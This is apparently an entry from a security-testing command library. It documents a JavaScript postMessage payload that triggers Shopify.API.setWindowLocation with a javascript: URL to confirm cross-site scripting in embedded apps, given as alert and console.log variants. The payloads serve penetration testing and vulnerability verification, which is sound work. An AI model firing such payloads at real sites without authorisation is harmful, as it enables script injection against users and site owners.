---
data: >-
  $$('iframe')[0].contentWindow.postMessage('{"message":"Shopify.API.setWindowLocation","data":"javascript:alert(document.domain);0[0]"}','*')
tags:
  - xss
  - postmessage
type: command
executor: javascript
platforms:
  - Web
id: 1e35350a-3b6e-43bb-8dc6-1ac4d298a368
created_at: '2025-12-13T23:56:03.990Z'
updated_at: '2025-12-13T23:56:03.990Z'
verified: false
validated: true
submitted: true
---
# PostMessage SetWindowLocation

## Command

```javascript
$$('iframe')[0].contentWindow.postMessage('{"message":"Shopify.API.setWindowLocation","data":"javascript:alert(document.domain);0[0]"}','*')
```

## Description

Sends a postMessage to the iframe to trigger Shopify.API.setWindowLocation with a javascript: URL, executing alert(document.domain). Used to verify self-XSS in embedded apps.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `message` | Specifies the event Shopify.API.setWindowLocation | Yes |
| `data` | The URL to navigate to, here a javascript: payload | Yes |

## Examples

### Basic Usage

```javascript
$$('iframe')[0].contentWindow.postMessage('{"message":"Shopify.API.setWindowLocation","data":"javascript:alert(document.domain);0[0]"}','*')
```

### Advanced Usage

```javascript
$$('iframe')[0].contentWindow.postMessage('{"message":"Shopify.API.setWindowLocation","data":"javascript:console.log('exploited');0[0]"}','*')
```

## Expected Output

Alerts the document domain, confirming XSS execution.

## Related

- [[procedures/Verify-Self-XSS-via-PostMessage]]
- [[commands/set-secure-admin-session-id-cookie]]
